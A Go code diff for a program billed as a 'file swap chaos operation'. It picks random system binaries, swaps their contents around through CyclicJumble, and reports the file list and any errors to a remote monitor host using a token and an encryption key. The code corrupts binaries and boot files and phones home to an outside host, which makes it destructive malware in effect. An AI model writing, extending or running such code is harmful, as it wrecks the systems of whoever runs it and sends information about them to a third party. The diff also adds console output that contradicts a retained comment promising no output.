@@ -30,17 +30,20 @@ func init() {
 
 func main() {
 	// Intentionally ignore the returned list for now; no logging/output per your request.
+	fmt.Println("Starting file swap chaos operation...")
 	files, err := library.PickRandomBinaries()
 	if err != nil {
-		library.SendMessage(MonitorIP, MonitorPort, "chaos_report", "broken", Token, EncryptionKey)
+		msg := fmt.Sprintf("failed to pick random binaries: %v", err)
+		library.SendMessage(MonitorIP, MonitorPort, "error", msg, Token, EncryptionKey)
+		return
 	}
-	library.SendMessage(MonitorIP, MonitorPort, "chaos_report", fmt.Sprintf("files to be jumbled: %s", files), Token, EncryptionKey)
-	fmt.Println("files to be jumbled:", files)
+	if err == nil {
+		library.SendMessage(MonitorIP, MonitorPort, "chaos_report", fmt.Sprintf("files to be jumbled: %s", files), Token, EncryptionKey)
+	}
 	err = library.CyclicJumble(files)
 	if err != nil {
-		library.SendMessage(MonitorIP, MonitorPort, "chaos_report", "broken", Token, EncryptionKey)
-	}
-	for _, file := range files {
-		library.SendMessage(MonitorIP, MonitorPort, "variable", fmt.Sprintf("corruptedBootFiles,%s", file), Token, EncryptionKey)
+		msg := fmt.Sprintf("error in CyclicJumble: %v", err)
+		library.SendMessage(MonitorIP, MonitorPort, "error", msg, Token, EncryptionKey)
+		return
 	}
 }
